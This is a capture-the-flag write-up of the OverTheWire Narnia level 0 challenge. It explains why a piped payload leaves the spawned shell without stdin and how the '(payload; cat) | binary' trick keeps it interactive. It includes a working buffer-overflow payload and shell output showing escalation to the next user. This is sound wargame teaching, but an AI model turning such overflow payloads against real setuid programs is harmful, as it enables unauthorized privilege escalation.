##cat and stdin

Our group recently went through the Narnia Series of challenges and we noted something interesting on thefirst challenge. There are lots of [writeups](https://hackmethod.com/overthewire-narnia-0/) available on the challenge online, which you should read if you need a refresher on the challenge, but I wanted to talk specifically about the issue many of us had when trying to pipe the payload into the binary.

The main issue lies in the section of code below. After changing the control flow successfully to point to the relevant lines of code, a shell is spawned using `system("/bin/sh")`

```c
    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
```

`system("/bin/sh")` spawns an interactive shell, which receives commands from stdin and writes to stdout. The stdin and stdout is inherited from the program. 

Unfortunately stdin is closed after piping in our input, and we do not have a channel to interact with the shell. 

```bash
narnia0@narnia:/narnia$ python -c 'import sys; sys.stdout.write("A"*20+"\xef\xbe\xad\xde")' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
narnia0@narnia:/narnia$ id
uid=14000(narnia0) gid=14000(narnia0) groups=14000(narnia0)
```

So that's not quite right. When you use a pipe, the stdout of the process before the pipe will become the stdin of the process after the pipe. However terminal stdin is disconnected from the channel. So what we need is a way to pipe stdin from the terminal, to the stdout of the left side of the pipe, and end up in stdin on the right side of the pipe. 

Cat happens to be a utility which does just that.

From the man pages:
```
NAME                                                                                                 
       cat - concatenate files and print on the standard output                                     
       [...]                                                                                        
       With no FILE, or when FILE is -, read standard input.     
```

So if we run a command like the following...

```bash
narnia0@narnia:/narnia$ (python -c 'import sys; sys.stdout.write("A"*20+"\xef\xbe\xad\xde")';cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
id
uid=14001(narnia1) gid=14000(narnia0) groups=14000(narnia0)   
```

The cat process is spawned, which takes terminal stdin pipes it to its stdout, which is in turn the stdin for the binary, allowing for interaction with the shell that is spawned.

You can check in another terminal that in fact the cat process is alive, and is the pipe between your terminal stdin, and the binaries.

```bash
narnia0@narnia:/narnia$ ps -ef | grep cat
narnia0   6086  6082  0 01:26 pts/4    00:00:00 cat
narnia0   6090  6072  0 01:26 pts/5    00:00:00 grep cat
```
